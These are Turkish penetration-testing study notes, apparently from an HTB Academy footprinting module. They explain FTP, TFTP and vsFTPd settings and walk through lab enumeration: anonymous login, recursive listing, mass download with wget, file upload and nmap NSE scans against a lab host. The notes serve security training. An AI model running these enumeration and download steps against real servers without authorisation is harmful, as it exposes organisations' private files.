---
{"dg-publish":true,"permalink":"/active-directory/footprinting/"}
---


Penetration testing ve enumeration dinamik bir süreçtir. External ve internal testler için esnek bir metodoloji geliştirilmiştir. Bu metodoloji, 6 katmandan oluşur ve enumeration sürecini üç seviyeye ayırır, ortama göre değişikliklere ve uyarlamalara imkan tanır.

* `Infrastructure-based enumeration`
* `Host-based enumeration`
* `OS-based enumeration`

[Ayrıntılı Resim](https://academy.hackthebox.com/storage/modules/112/enum-method3.png)

Not: Gösterilen her katmanın bileşenleri ana kategorileri temsil etmektedir ve aranacak tüm bileşenlerin tam listesi değildir. Ayrıca, burada birinci ve ikinci katmanın (İnternet Varlığı, Gateway) Active Directory altyapısı gibi `intranet` için tam olarak geçerli olmadığı belirtilmelidir. İç altyapıya yönelik katmanlar diğer modüllerde ele alınacaktır.

| **Katman**                 | **Açıklama**                                                                            | **Bilgi Kategorileri**                                                                                            |
| -------------------------- | --------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| **İnternet Varlığı**       | Şirketin internet üzerindeki varlığını ve dışarıdan erişilebilen altyapısını tanımlama. | `Domain`'ler, `Subdomain`'ler, `vHost`'lar, ASN, Netblock'lar, IP Adresleri, Cloud Sunucuları, Güvenlik Önlemleri |
| **Gateway**                | Şirketin dış ve iç altyapısını korumak için olası güvenlik önlemlerini belirleme.       | Firewall'lar, DMZ, IPS/IDS, EDR, Proxy'ler, NAC, Ağ Segmentasyonu, VPN, Cloudflare                                |
| **Erişilebilir Servisler** | Dışarıda veya içeride barındırılan erişilebilir arayüzleri ve servisleri tanımlama.     | Servis Türü, İşlevsellik, Konfigürasyon, Port, Versiyon, Arayüz                                                   |
| **Process'ler**            | Servislerle ilişkili iç process'leri, kaynakları ve hedefleri tanımlama.                | PID, İşlenen Veriler, Görevler, Kaynak, Hedef                                                                     |
| **Privileges**             | Erişilebilir servislere yönelik iç izin ve yetkileri belirleme.                         | Groups, Users, Permissions, Restrictions, Environment                                                             |
| **OS Yapılandırması**      | İç bileşenleri ve sistem yapılandırmasını tanımlama.                                    | OS Türü, Yama Seviyesi, Ağ Konfigürasyonu, OS Ortamı, Konfigürasyon Dosyaları, Hassas Private Dosyalar            |

# FTP

* FTP, TCP/IP protokol stack'inin `application` katmanında çalışır.
* Böylece `HTTP` ya da `POP` ile aynı katmanda yer alır. Bu protokoller de servislerini gerçekleştirmek için browser ya da e-posta clientlerin desteği ile çalışır. File Transfer Protocol için özel FTP programları da vardır.

FTP protokolünü kullanarak lokal dosyaları bir sunucuya yüklemek ve diğer dosyaları indirmek istediğimizi düşünelim. Bir FTP bağlantısında iki kanal açılır. İlk olarak, `client` ve server TCP port 21 üzerinden bir `kontrol` `kanalı` kurarlar. Client sunucuya komutlar gönderir ve sunucu durum kodlarını döndürür. Daha sonra her iki iletişim katılımcısı TCP port 20 üzerinden veri kanalını kurar. Bu kanal yalnızca veri iletimi için kullanılır ve protokol bu işlem sırasında hataları izler. İletim sırasında bir bağlantı koparsa, yeniden temas kurulduktan sonra aktarım devam ettirilebilir.


**Aktif FTP:**

- FTP client, sunucuya TCP port 21 üzerinden bağlanıyor.
- Client, sunucuya hangi client  portu üzerinden veri alışverişi yapacağını söylüyor.
- Ancak, client bir güvenlik duvarı (firewall) ile korunuyorsa, dışarıdan gelen bağlantılar (sunucunun client’e cevap vermesi) engellenebilir. Yani firewall sunucunun bağlantı başlatmasını engeller.

**Pasif FTP:**

- Bu sorun için **pasif mod** geliştirilmiş.
- Pasif modda, sunucu client’e, hangi sunucu portu üzerinden veri alışverişi yapacağını söyler.
- Bu modda bağlantıyı **client başlattığı için**, firewall client’den gelen isteği engellemez.

FTP (File Transfer Protocol), dosya transferi için kullanılan bir protokoldür. Client, sunucuya dosya yükleme, indirme, silme veya dizin oluşturma gibi komutlar gönderir. Sunucu, her komuta bir [durum koduyla](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes) yanıt verir; bu kod, işlemin başarılı olup olmadığını veya hangi aşamada olduğunu belirtir.

[[Bağlantılar/Aktif ve pasif mod farkı detaylı açıklama\|Aktif ve pasif mod farkı detaylı açıklama]]


### FTP Komutları

·  **`USER`**: client, bu komut ile sunucuya kullanıcı adını bildirir.
·  **`PASS`**: Kullanıcı şifresini sunucuya gönderir.
·  **`LIST`**: Sunucudaki mevcut dosya ve dizinlerin listesini istemek için kullanılır.
·  **`RETR`**: Sunucudan dosya indirme isteği.
·  **`STOR`**: Sunucuya dosya yükleme isteği.
·  **`DELE`**: Sunucudaki bir dosyayı silme komutu.
·  **`MKD`**: Sunucuda yeni bir dizin oluşturma komutu.
·  **`CWD`**: Sunucudaki mevcut çalışma dizinini değiştirme komutu.


### **FTP Durum Kodları**

Her komut sonrasında sunucu, komutun sonucunu belirten bir **üç haneli durum kodu** ile cevap verir.

·  **`200`**: Komut başarıyla kabul edildi. ("OK" anlamına gelir)
·  **`220`**: Sunucu bağlantıya hazır.
·  **`221`**: Oturum kapatıldı.
·  **`230`**: Başarıyla giriş yapıldı.
·  **`331`**: Kullanıcı adı kabul edildi, şifre bekleniyor.
·  **`425`**: Bağlantı kurulamadı.
·  **`450`**: Dosya işlenemedi (örneğin, dosyaya erişim engellendi).
·  **`500`**: Geçersiz komut (komut tanınmadı).
·  **`550`**: Dosya bulunamadı ya da erişim engellendi (örneğin, dosya silinemedi).

Ayrıca FTP'nin açık metinli bir protokoldür . MITM açık .


### **TFTP**

`Trivial File Transfer Protocol` (TFTP) FTP'den daha basittir ve client ve server processleri arasında dosya transferi gerçekleştirir. Ancak, kullanıcı `kimlik doğrulaması` ve FTP tarafından desteklenen diğer değerli özellikleri sağlamaz. Buna ek olarak, FTP `TCP` kullanırken, TFTP `UDP` kullanır, bu da onu güvenilmez bir protokol haline getirir ve UDP destekli uygulama katmanı **hata yönetimi** kullanmasına neden olur.

Parolalar aracılığıyla korumalı oturum açmayı desteklemez ve yalnızca işletim sistemindeki bir dosyanın okuma ve yazma izinlerine dayalı olarak erişim sınırlarını belirler.

Güvenlik eksikliği nedeniyle, TFTP, FTP'den farklı olarak, yalnızca local ve korumalı ağlarda kullanılabilir.



### TFTP Komutları :

**`connect`** : Dosya aktarımları için remote host'u ve isteğe bağlı olarak portu ayarlar.

**`get`** : Bir dosyayı veya dosya kümesini remote host'tan local host'a aktarır.

**`put`** : Bir dosyayı veya dosya kümesini local hosttan uzak host üzerine aktarır.

**`quit`** : Tftp'den çıkar.

**`status`** : Geçerli aktarım modu (ascii veya binary), bağlantı durumu, zaman aşımı değeri vb. dahil olmak üzere tftp'nin geçerli durumunu gösterir.

**`verbose`** : Dosya aktarımı sırasında ek bilgi görüntüleyen verbose modunu açar veya kapatır.

FTP client’inin aksine, TFTP `dizin listeleme` işlevine sahip değildir.


## Default Configuration

Linux tabanlı dağıtımlarda en çok kullanılan FTP sunucularından biri [vsFTPd](https://security.appspot.com/vsftpd.html)'dir. vsFTPd'nin varsayılan yapılandırması **/etc/vsftpd.conf** dosyasında bulunabilir ve bazı ayarlar varsayılan olarak önceden tanımlanmıştır.

#### Install vsFTPd

```shell-session
M1R4CKCK@htb[/htb]$ sudo apt install vsftpd 
```

Yapılandırma sayfasının [man](http://vsftpd.beasts.org/vsftpd_conf.html) sayfası


#### vsFTPd Config File

```shell-session
M1R4CKCK@htb[/htb]$ cat /etc/vsftpd.conf | grep -v "#"
```



| **Ayar**                                                        | **Açıklama**                                                                                                                                             |
| --------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **listen=NO**                                                   | VSFTPD'nin inetd üzerinden mi yoksa  **Standalone** (bağımsız) bir daemon olarak mı çalıştırılacağını belirler. ([[Bağlantılar/inetd ve Standalone nedir açıklama\|inetd ve Standalone nedir açıklama]]) |
| **listen_ipv6=YES**                                             | IPv6 üzerinden bağlantı dinlenip dinlenmeyeceğini belirler.                                                                                              |
| **anonymous_enable=NO**                                         | Anonim kullanıcıların erişimine izin verilip verilmeyeceğini belirler.                                                                                   |
| **local_enable=YES**                                            | Local kullanıcıların oturum açmasına izin verir.                                                                                                         |
| **dirmessage_enable=YES**                                       | Kullanıcılar belirli dizinlere girdiğinde aktif dizin mesajlarını görüntüler.                                                                            |
| **use_localtime=YES**                                           | Local saati kullanmayı etkinleştirir.                                                                                                                    |
| **xferlog_enable=YES**                                          | Yükleme/indirme işlemlerinin kaydedilmesini etkinleştirir.                                                                                               |
| **connect_from_port_20=YES**                                    | Port 20 üzerinden bağlantı kurulmasını sağlar.                                                                                                           |
| **secure_chroot_dir=/var/run/vsftpd/empty**                     | Güvenli bir [[Bağlantılar/chroot\|chroot]] processi için kullanılan boş dizinin adını belirtir.                                                                              |
| **pam_service_name=vsftpd**                                     | VSFTPD'nin kullanacağı [[Bağlantılar/PAM servisini\|PAM servisini]] adını belirtir.                                                                                                 |
| **rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem**          | SSL şifreli bağlantılar için kullanılan RSA sertifika dosyasının yolunu belirtir.                                                                        |
| **rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key** | SSL bağlantıları için kullanılan RSA private key dosyasının yolunu belirtir.                                                                             |
| **ssl_enable=NO**                                               | SSL şifrelemesini etkinleştirir veya devre dışı bırakır.                                                                                                 |

Bu ayarlar, **vsftpd.conf** dosyasında yapılandırılarak FTP sunucusunun çalışma şeklini belirler. Özellikle güvenlik açısından **`anonymous_enable`**, **`ssl_enable`**, ve **`pam_service_name`** gibi ayarların doğru yapılandırılması önemlidir.

Ayrıca, **`/etc/ftpusers`** adında bir dosya vardır ve bu dosyaya da dikkat etmemiz gerekir, çünkü bu dosya belirli kullanıcıların FTP servisine erişimini engellemek için kullanılır. Aşağıdaki örnekte, `guest`, `john` ve `kevin` kullanıcılarının Linux sisteminde var olsalar bile FTP servisine giriş yapmalarına izin verilmez.


#### FTPUSERS

```shell-session
M1R4CKCK@htb[/htb]$ cat /etc/ftpusers

guest
john
kevin
```


## Dangerous Settings

FTP sunucularında güvenlik için kimlik doğrulama ve anonim erişim gibi ayarlar yapılabilir. vsFTPd'de anonim oturum açmayı yapılandırmak mümkündür.

| **Ayar**                         | **Açıklama**                                                                                                                 |
| -------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| **anonymous_enable=YES**         | Anonim kullanıcıların oturum açmasına izin verilip verilmediğini belirler.                                                   |
| **anon_upload_enable=YES**       | Anonim kullanıcıların dosya yüklemesine izin verir.                                                                          |
| **anon_mkdir_write_enable=YES**  | Anonim kullanıcıların yeni dizinler oluşturmasına izin verir.                                                                |
| **no_anon_password=YES**         | Anonim kullanıcıdan parola istenmemesini sağlar.                                                                             |
| **anon_root=/home/username/ftp** | Anonim kullanıcıların erişimine izin verilen dizini belirtir.                                                                |
| **write_enable=YES**             | FTP komutlarının kullanılmasına izin verir: **STOR**, **DELE**, **RNFR**, **RNTO**, **MKD**, **RMD**, **APPE**, ve **SITE**. |

vsFTPd sunucusuna bağlanır bağlanmaz, FTP sunucusunun banner'ı ile birlikte 220 yanıt kodu görüntülenir. Genellikle bu banner servisin açıklamasını ve hatta `sürümünü` içerir.

#### Anonymous Login

```shell-session
M1R4CKCK@htb[/htb]$ ftp 10.129.14.136

Connected to 10.129.14.136.
220 "Welcome to the HTB Academy vsFTP service."
Name (10.129.14.136:cry0l1t3): anonymous

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.


ftp> ls

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
226 Directory send OK.
```

Ancak, sunucu ayarlarına ilk genel bakışı elde etmek için aşağıdaki komutu kullanabiliriz:


#### vsFTPd Status

```shell-session
ftp> status

Connected to 10.129.14.136.
No proxy connection.
Connecting using address family: any.
Mode: stream; Type: binary; Form: non-print; Structure: file
Verbose: on; Bell: off; Prompting: on; Globbing: on
Store unique: off; Receive unique: off
Case: off; CR stripping: on
Quote control characters: on
Ntrans: off
Nmap: off
Hash mark printing: off; Use of PORT cmds: on
Tick counter printing: off
```

Bazı komutlar ara sıra kullanılmalıdır, çünkü bunlar sunucunun bize amaçlarımız için kullanabileceğimiz daha fazla bilgi göstermesini sağlayacaktır. Bu komutlar `debug` ve `trace` komutlarını içerir.


#### vsFTPd Detailed Output (debug - trace)

```shell-session
ftp> debug

Debugging on (debug=1).


ftp> trace

Packet tracing on.


ftp> ls

---> PORT 10,10,14,4,188,195
200 PORT command successful. Consider using PASV.
---> LIST
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
226 Directory send OK.
```


| **Ayar**                    | **Açıklama**                                                                                                          |
| --------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| **dirmessage_enable=YES**   | Kullanıcılar yeni bir dizine ilk kez girdiklerinde bir mesaj gösterilmesini sağlar.                                   |
| **chown_uploads=YES**       | Anonim olarak yüklenen dosyaların sahipliğinin değiştirilmesini etkinleştirir.                                        |
| **chown_username=username** | Anonim olarak yüklenen dosyaların sahipliği verilecek kullanıcıyı belirtir.                                           |
| **local_enable=YES**        | Local kullanıcıların oturum açmasına izin verir.                                                                      |
| **chroot_local_user=YES**   | Local kullanıcıları kendi **home** dizinlerine kilitler.                                                              |
| **chroot_list_enable=YES**  | Local kullanıcıların **home** dizinlerine kilitlenmesini belirlemek için bir kullanıcı listesi kullanılmasını sağlar. |

Bu ayarlar, local ve anonim kullanıcıların erişim haklarını, yükleme davranışlarını ve dizinlerdeki hareketlerini kontrol etmeye yöneliktir. Özellikle **`chroot_local_user`** ve **`chroot_list_enable`** ayarları, kullanıcıların yalnızca izin verilen dizinlere erişmesini sağlayarak güvenliği artırır.


| **Ayar**                  | **Açıklama**                                                                                                 |
| ------------------------- | ------------------------------------------------------------------------------------------------------------ |
| **hide_ids=YES**          | Dizin listelerinde tüm kullanıcı ve grup bilgilerini "ftp" olarak görüntüler.                                |
| **ls_recurse_enable=YES** | Dizin listelerinde alt dizinlerin de listelenmesini sağlar (**recursive listing** özelliğini etkinleştirir). |

Bu ayarlar, FTP sunucusunda dizin listelerinin nasıl görüntüleneceğini kontrol eder. **`hide_ids`** ayarı, kullanıcı ve grup bilgilerinin gizlenmesini sağlarken, **`ls_recurse_enable`** ise dizin içeriklerini daha kapsamlı listelemek için kullanılabilir.

Eğer `hide_ids=YES` ayarı aktifse, servisin `UID` (Kullanıcı Kimliği) ve `GID` (Grup Kimliği) bilgileri gizlenecek ve bu durum, dosyaların hangi kullanıcı ve grup tarafından oluşturulduğunu veya yüklendiğini belirlemeyi zorlaştıracaktır.

#### Hiding IDs - YES

```shell-session
ftp> ls

---> TYPE A
200 Switching to ASCII mode.
ftp: setsockopt (ignored): Permission denied
---> PORT 10,10,14,4,223,101
200 PORT command successful. Consider using PASV.
---> LIST
150 Here comes the directory listing.
-rw-rw-r--    1 ftp     ftp      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 ftp     ftp         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 ftp     ftp         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 ftp     ftp         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 ftp     ftp           41 Sep 14 16:45 Important Notes.txt
-rw-------    1 ftp     ftp            0 Sep 15 14:57 testupload.txt
226 Directory send OK.
```


`TYPE A`: FTP client'i ASCII moduna geçti, bu mod text dosyalarının transferi için kullanılır.

`Permission denied`: FTP client'inin soket ayarlarını değiştirme izni olmadığı anlamına gelir; genellikle kritik bir durum değildir.

`PORT 10,10,14,4,223,101`: Bu komut, FTP transferi için bir veri bağlantısı ayarlamakta kullanılır. Sayılar, clientinin IP adresini ve portunu temsil eder.

`LIST`: Bu komut, mevcut dizindeki dosya ve dizinlerin listesini alır.

Bu ayar lokal kullanıcı adlarının açığa çıkmasını engelleyen bir güvenlik özelliğidir. Kullanıcı adları ile FTP ve SSH gibi servislere ve diğerlerine teoride `brute-force` saldırısı ile saldırabiliriz. Ancak gerçekte, **[fail2ban](https://en.wikipedia.org/wiki/Fail2ban)** çözümleri artık IP adresini günlüğe kaydeden ve belirli sayıda başarısız giriş denemesinden sonra altyapıya tüm erişimi engelleyen herhangi bir altyapının standart bir uygulamasıdır.

**`ls_recurse_enable=YES`** ayarı, genellikle vsFTPd sunucusunda FTP dizin yapısını daha iyi görmek için kullanılır; bu ayar, tüm görünür içeriği tek seferde görüntülememizi sağlar.


#### Recursive Listing

```shell-session
ftp> ls -R

---> PORT 10,10,14,4,222,149
200 PORT command successful. Consider using PASV.
---> LIST -R
150 Here comes the directory listing.
.:
-rw-rw-r--    1 ftp      ftp      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 ftp      ftp           41 Sep 14 16:45 Important Notes.txt
-rw-------    1 ftp      ftp            0 Sep 15 14:57 testupload.txt

./Clients:
drwx------    2 ftp      ftp          4096 Sep 16 18:04 HackTheBox
drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:00 Inlanefreight

./Clients/HackTheBox:
-rw-r--r--    1 ftp      ftp         34872 Sep 16 18:04 appointments.xlsx
-rw-r--r--    1 ftp      ftp        498123 Sep 16 18:04 contract.docx
-rw-r--r--    1 ftp      ftp        478237 Sep 16 18:04 contract.pdf
-rw-r--r--    1 ftp      ftp           348 Sep 16 18:04 meetings.txt

./Clients/Inlanefreight:
-rw-r--r--    1 ftp      ftp         14211 Sep 16 18:00 appointments.xlsx
-rw-r--r--    1 ftp      ftp         37882 Sep 16 17:58 contract.docx
-rw-r--r--    1 ftp      ftp            89 Sep 16 17:58 meetings.txt
-rw-r--r--    1 ftp      ftp        483293 Sep 16 17:59 proposal.pptx

./Documents:
-rw-r--r--    1 ftp      ftp         23211 Sep 16 18:05 appointments-template.xlsx
-rw-r--r--    1 ftp      ftp         32521 Sep 16 18:05 contract-template.docx
-rw-r--r--    1 ftp      ftp        453312 Sep 16 18:05 contract-template.pdf

./Employees:
226 Directory send OK.
```

Böyle bir FTP sunucusundan dosya indirmek temel özelliklerden biridir, ayrıca oluşturduğumuz dosyaları yüklemek de mümkündür. Bu, örneğin, bir **LFI** açığını kullanarak **host**'un **system command** çalıştırmasını sağlamamıza olanak tanır. Dosyaların yanı sıra, görüntüleyebilir, indirebilir ve inceleyebiliriz. Ayrıca, **FTP logs** üzerinden yapılan saldırılar **Remote Command Execution (RCE)** ile sonuçlanabilir. Bu durum, yalnızca **FTP services** için değil, aynı zamanda **enumeration** aşamasında tespit edebildiğimiz tüm servisler için geçerlidir.


#### Download a File

```shell-session
ftp> ls

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxrwx    1 ftp      ftp             0 Sep 16 17:24 Calendar.pptx
drwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients
drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents
drwxrwxrwx    2 ftp      ftp          4096 Sep 16 17:24 Employees
-rwxrwxrwx    1 ftp      ftp            41 Sep 18 15:58 Important Notes.txt
226 Directory send OK.


ftp> get Important\ Notes.txt

local: Important Notes.txt remote: Important Notes.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Important Notes.txt (41 bytes).
226 Transfer complete.
41 bytes received in 0.00 secs (606.6525 kB/s)


ftp> exit

221 Goodbye.
```

```shell-session
M1R4CKCK@htb[/htb]$ ls | grep Notes.txt

'Important Notes.txt'
```

Ayrıca erişebildiğimiz tüm dosya ve klasörleri tek seferde indirebiliriz. Bu, özellikle FTP sunucusunda daha büyük bir klasör yapısında birçok farklı dosya varsa kullanışlıdır. Ancak, şirketten hiç kimse genellikle tüm dosyaları ve içeriği bir kerede indirmek istemediği için bu durum `alarmlara` neden olabilir.


#### Download All Available Files

```shell-session
M1R4CKCK@htb[/htb]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136

--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/                                         
           => ‘10.129.14.136/.listing’                                                                     
Connecting to 10.129.14.136:21... connected.                                                               
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PORT ... done.    ==> LIST ... done.                                                                 
12.12.1.136/.listing           [ <=>                                  ]     466  --.-KB/s    in 0s       
                                                                                                         
2021-09-19 14:45:58 (65,8 MB/s) - ‘10.129.14.136/.listing’ saved [466]                                     
--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/Calendar.pptx   
           => ‘10.129.14.136/Calendar.pptx’                                       
==> CWD not required.                                                           
==> SIZE Calendar.pptx ... done.                                                                                                                            
==> PORT ... done.    ==> RETR Calendar.pptx ... done.       

...SNIP...

2021-09-19 14:45:58 (48,3 MB/s) - ‘10.129.14.136/Employees/.listing’ saved [119]

FINISHED --2021-09-19 14:45:58--
Total wall clock time: 0,03s
Downloaded: 15 files, 1,7K in 0,001s (3,02 MB/s)
```

Tüm dosyaları indirdikten sonra, wget hedefimizin IP adresinin adıyla bir dizin oluşturacaktır. İndirilen tüm dosyalar burada saklanır ve daha sonra lokal olarak inceleyebiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ tree .

.
└── 10.129.14.136
    ├── Calendar.pptx
    ├── Clients
    │   └── Inlanefreight
    │       ├── appointments.xlsx
    │       ├── contract.docx
    │       ├── meetings.txt
    │       └── proposal.pptx
    ├── Documents
    │   ├── appointments-template.xlsx
    │   ├── contract-template.docx
    │   └── contract-template.pdf
    ├── Employees
    └── Important Notes.txt

5 directories, 9 files
```

FTP sunucusuna dosya yükleme izni, web sunucularında hızlı erişim ve senkronizasyon için yaygın bir uygulamadır. Ancak, yöneticilerin yapılandırma hataları genellikle ihmal edilir. FTP üzerinden dosya yükleyebilmek, web sunucusuna doğrudan erişim sağlamanın yanı sıra, reverse shell ile komut çalıştırma ve ayrıcalık yükseltme fırsatları sunabilir.


#### Upload a File

```shell-session
M1R4CKCK@htb[/htb]$ touch testupload.txt
```

PUT komutu ile mevcut klasördeki dosyaları FTP sunucusuna yükleyebiliriz.

```shell-session
ftp> put testupload.txt 

local: testupload.txt remote: testupload.txt
---> PORT 10,10,14,4,184,33
200 PORT command successful. Consider using PASV.
---> STOR testupload.txt
150 Ok to send data.
226 Transfer complete.


ftp> ls

---> TYPE A
200 Switching to ASCII mode.
---> PORT 10,10,14,4,223,101
200 PORT command successful. Consider using PASV.
---> LIST
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
-rw-------    1 1002     133             0 Sep 15 14:57 testupload.txt
226 Directory send OK.
```


## Footprinting the Service

```shell-session
M1R4CKCK@htb[/htb]$ sudo nmap --script-updatedb

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 13:49 CEST
NSE: Updating rule database.
NSE: Script Database updated successfully.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.28 seconds
```

```shell-session
M1R4CKCK@htb[/htb]$ find / -type f -name ftp* 2>/dev/null | grep scripts

/usr/share/nmap/scripts/ftp-syst.nse
/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-bounce.nse
/usr/share/nmap/scripts/ftp-libopie.nse
/usr/share/nmap/scripts/ftp-anon.nse
/usr/share/nmap/scripts/ftp-brute.nse
```

Bildiğimiz gibi, FTP sunucusu genellikle Nmap kullanarak tarayabileceğimiz standart TCP portu 21 üzerinde çalışır. Ayrıca hedefimiz 10.129.14.136'ya karşı version taraması (-sV), agresif tarama (-A) ve varsayılan komut dosyası taraması (-sC) kullanıyoruz.

```shell-session
M1R4CKCK@htb[/htb]$ sudo nmap -sV -p21 -sC -A 10.129.14.136

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-16 18:12 CEST
Nmap scan report for 10.129.14.136
Host is up (0.00013s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx    1 ftp      ftp       8138592 Sep 16 17:24 Calendar.pptx [NSE: writeable]
| drwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients [NSE: writeable]
| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents [NSE: writeable]
| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 17:24 Employees [NSE: writeable]
| -rwxrwxrwx    1 ftp      ftp            41 Sep 16 17:24 Important Notes.txt [NSE: writeable]
|_-rwxrwxrwx    1 ftp      ftp             0 Sep 15 14:57 testupload.txt [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```

Varsayılan script taraması servislerin parmak izlerini, yanıtlarını ve standart portlarını temel alır. Nmap servisi tespit ettikten sonra, işaretli scriptleri birbiri ardına çalıştırarak farklı bilgiler sağlar. Örneğin, ftp-anon NSE scripti FTP sunucusunun anonim erişime izin verip vermediğini kontrol eder. Eğer öyleyse, FTP root dizininin içeriği anonim kullanıcı için oluşturulur.

Örneğin `ftp-syst`, FTP sunucusunun durumu hakkında bilgi görüntüleyen `STAT` komutunu çalıştırır. Bu, yapılandırmaların yanı sıra FTP sunucusunun sürümünü de içerir. Nmap ayrıca, taramalarımızda `--script-trace` seçeneğini kullanırsak, NSE komut dosyalarının ilerlemesini ağ düzeyinde izleme yeteneği sağlar. Bu, Nmap'in hangi komutları gönderdiğini, hangi portların kullanıldığını ve taranan sunucudan hangi yanıtları aldığımızı görmemizi sağlar.


```shell-session
M1R4CKCK@htb[/htb]$ sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 13:54 CEST                                                                                                                                                   
NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.14.136:21]                                   
NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 16 [10.129.14.136:21]             
NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 24 [10.129.14.136:21]
NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 32 [10.129.14.136:21]
NSOCK INFO [11.4640s] nsock_read(): Read request from IOD #1 [10.129.14.136:21] (timeout: 7000ms) EID 42
NSOCK INFO [11.4640s] nsock_read(): Read request from IOD #2 [10.129.14.136:21] (timeout: 9000ms) EID 50
NSOCK INFO [11.4640s] nsock_read(): Read request from IOD #3 [10.129.14.136:21] (timeout: 7000ms) EID 58
NSOCK INFO [11.4640s] nsock_read(): Read request from IOD #4 [10.129.14.136:21] (timeout: 11000ms) EID 66
NSE: TCP 10.10.14.4:54226 > 10.129.14.136:21 | CONNECT
NSE: TCP 10.10.14.4:54228 > 10.129.14.136:21 | CONNECT
NSE: TCP 10.10.14.4:54230 > 10.129.14.136:21 | CONNECT
NSE: TCP 10.10.14.4:54232 > 10.129.14.136:21 | CONNECT
NSOCK INFO [11.4660s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 50 [10.129.14.136:21] (41 bytes): 220 Welcome to HTB-Academy FTP service...
NSOCK INFO [11.4660s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 58 [10.129.14.136:21] (41 bytes): 220 Welcome to HTB-Academy FTP service...
NSE: TCP 10.10.14.4:54228 < 10.129.14.136:21 | 220 Welcome to HTB-Academy FTP service.
```

Tarama geçmişi, servise karşı çeşitli zaman aşımlarıyla birlikte dört farklı paralel taramanın çalıştığını gösteriyor. NSE scriptleri için, lokal makinemizin diğer çıkış portlarını (54226, 54228, 54230, 54232) kullandığını ve ilk olarak `CONNECT` komutuyla bağlantıyı başlattığını görüyoruz. Sunucudan gelen ilk yanıttan, hedef FTP sunucusundan ikinci NSE scriptimize (54228) sunucudan banner aldığımızı görebiliyoruz. Gerekirse, elbette, FTP sunucusuyla etkileşim kurmak için `netcat` veya `telnet` gibi diğer uygulamaları kullanabiliriz.


### Service Etkileşimi

```shell-session
M1R4CKCK@htb[/htb]$ nc -nv 10.129.14.136 21
```

```shell-session
M1R4CKCK@htb[/htb]$ telnet 10.129.14.136 21
```

